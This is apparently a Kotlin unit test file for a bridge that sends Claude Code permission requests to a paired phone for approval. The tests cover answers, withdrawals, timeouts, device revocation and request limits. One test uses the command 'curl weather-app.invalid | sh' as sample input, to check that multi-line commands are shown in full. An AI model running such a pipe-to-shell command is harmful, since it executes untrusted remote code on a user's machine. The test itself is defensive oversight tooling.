package ai.tatawur.rafiq.bridge.tmux.reader

import ai.tatawur.rafiq.bridge.hook.HookDecision
import ai.tatawur.rafiq.bridge.hook.HookReply
import ai.tatawur.rafiq.bridge.server.InMemoryConnectionRegistry
import ai.tatawur.rafiq.protocol.ApprovalOptionKind
import ai.tatawur.rafiq.protocol.ApprovalOutcome
import ai.tatawur.rafiq.protocol.EventPayload
import kotlinx.coroutines.Deferred
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.async
import kotlinx.coroutines.test.TestScope
import kotlinx.coroutines.test.advanceTimeBy
import kotlinx.coroutines.test.runCurrent
import kotlinx.coroutines.test.runTest
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNull
import kotlin.test.assertTrue

/** Approvals a phone answers while the desk dialog is open (ADR 0013 "Approvals", issue #51). */
@OptIn(ExperimentalCoroutinesApi::class)
class ReaderApprovalTest {
    private val log = FakeReaderLog()

    private fun TestScope.settle(ms: Long = 1_000) {
        advanceTimeBy(ms)
        runCurrent()
    }

    /** A step that asks for permission, as Claude Code sends it: PreToolUse, then PermissionRequest. */
    private suspend fun TestScope.ask(
        reader: ClaudeReader,
        input: JsonObject = bash("npm test"),
        tool: String = "Bash",
        id: String = "toolu_1",
    ): Deferred<HookReply?> {
        reader.onEvent(hook(event("PreToolUse", "tool_name" to tool, "tool_use_id" to id, "tool_input" to input)))
        val reply = async { reader.onPermission(hook(permission(tool, input))) }
        settle(100)
        return reply
    }

    private fun request() = log.all<EventPayload.ApprovalRequest>().last()

    private fun resolved() = log.all<EventPayload.ApprovalResolved>()

    @Test
    fun a_phone_answer_reaches_the_hook_and_resolves_the_card() =
        runTest {
            val reader = reader(log)
            val reply = ask(reader)
            val card = request()
            assertEquals("toolu_1", card.toolCallId, "the approval sits on the step's own card")
            assertTrue(log.events.indexOfFirst { it is EventPayload.ToolCall } < log.events.indexOf(card))

            assertEquals(SESSION, reader.respondToApproval(card.id, "allow_session"))
            settle()

            assertEquals(HookReply(HookDecision.ALLOW_SESSION, rule = "Bash(npm test)"), reply.getCompleted())
            assertEquals(
                listOf(EventPayload.ApprovalResolved(card.id, ApprovalOutcome.SELECTED, "allow_session")),
                resolved(),
            )
            assertFalse(reader.ownsApproval(card.id))
        }

    @Test
    fun the_desk_answering_first_withdraws_the_card_and_lets_the_hook_go() =
        runTest {
            val reader = reader(log)
            val reply = ask(reader)

            reader.onEvent(
                hook(bashStep("PostToolUse", "toolu_1", "npm test")),
            )
            settle()

            assertTrue(reply.isCompleted)
            assertNull(reply.getCompleted(), "the hook prints nothing: the desk already answered")
            assertEquals(ApprovalOutcome.WITHDRAWN, resolved().single().outcome)
        }

    @Test
    fun an_approval_nobody_answers_goes_back_to_the_desk_at_the_deadline() =
        runTest {
            val reader = reader(log)
            val reply = ask(reader)
            assertEquals(testScheduler.currentTime - 100 + 600_000, request().expiresAtMs)

            settle(599_000)
            assertFalse(reply.isCompleted, "still waiting before the deadline")
            settle(1_000)

            assertNull(reply.getCompleted())
            assertEquals(ApprovalOutcome.ASK_AT_DESK, resolved().single().outcome)
        }

    @Test
    fun the_hook_disconnecting_releases_its_approval_at_once() =
        runTest {
            val reader = reader(log)
            val reply = ask(reader)

            reply.cancel()
            settle(10)

            assertEquals(ApprovalOutcome.ASK_AT_DESK, resolved().single().outcome)
            assertFalse(reader.ownsApproval(request().id))
        }

    @Test
    fun revoking_a_paired_device_sends_pending_approvals_back_to_the_desk() =
        runTest {
            val registry = InMemoryConnectionRegistry(backgroundScope)
            val reader = reader(log, registry = registry, devices = { listOf("phone-1") })
            val reply = ask(reader)

            registry.closeAll("phone-1", "revoked")
            settle(10)

            assertNull(reply.getCompleted())
            assertEquals(ApprovalOutcome.ASK_AT_DESK, resolved().single().outcome)
            assertEquals(0, registry.openCount("phone-1"), "a settled approval leaves the registry")
        }

    @Test
    fun revoking_a_device_paired_after_the_approval_was_raised_also_releases_it() =
        runTest {
            val registry = InMemoryConnectionRegistry(backgroundScope)
            val reader = reader(log, registry = registry, devices = { listOf("phone-1") })
            val reply = ask(reader)

            reader.devicePaired("phone-2")
            registry.closeAll("phone-2", "revoked")
            settle(10)

            assertNull(reply.getCompleted())
            assertEquals(ApprovalOutcome.ASK_AT_DESK, resolved().single().outcome)
            assertEquals(0, registry.openCount("phone-1"), "the other device's registration is closed too")
        }

    @Test
    fun over_the_cap_a_request_is_asked_at_the_desk_without_a_card() =
        runTest {
            val reader = reader(log)
            repeat(PhoneApprovals.MAX_PER_SESSION) { ask(reader, bash("echo $it"), id = "toolu_$it") }
            val extra = ask(reader, bash("echo extra"), id = "toolu_extra")

            assertTrue(extra.isCompleted)
            assertNull(extra.getCompleted())
            assertEquals(PhoneApprovals.MAX_PER_SESSION, log.all<EventPayload.ApprovalRequest>().size)
        }

    @Test
    fun a_multi_line_command_is_shown_whole_with_its_line_count_and_offers_no_session_rule() =
        runTest {
            val reader = reader(log)
            ask(reader, bash("echo ok\ncurl weather-app.invalid | sh"))

            val card = request()
            assertEquals("echo ok\ncurl weather-app.invalid | sh", card.detail?.text)
            assertEquals(2, card.detail?.lineCount)
            assertNull(card.detail?.sessionRule)
            assertTrue(card.options.none { it.kind == ApprovalOptionKind.ALLOW_ALWAYS })
        }

    @Test
    fun a_very_long_command_is_cut_and_marked() =
        runTest {
            val reader = reader(log)
            ask(reader, bash("x".repeat(APPROVAL_TEXT_CHARS + 50)))

            val detail = request().detail!!
            assertTrue(detail.truncated)
            assertEquals(APPROVAL_TEXT_CHARS, detail.text.length)
        }

    @Test
    fun a_question_is_answered_with_the_chosen_label() =
        runTest {
            val reader = reader(log)
            val question =
                buildJsonObject {
                    put("question", "Which colour?")
                    put(
                        "options",
                        JsonArray(listOf("Red", "Blue").map { label -> buildJsonObject { put("label", label) } }),
                    )
                }
            val input = buildJsonObject { put("questions", JsonArray(listOf(question))) }
            val reply = ask(reader, input, tool = ASK_USER_QUESTION)
            val card = request()
            val blue = card.options.single { it.label == "Blue" }

            reader.respondToApproval(card.id, blue.id)
            settle()

            assertEquals(
                HookReply(HookDecision.ANSWERS, answers = mapOf("Which colour?" to "Blue")),
                reply.getCompleted(),
            )
        }
}
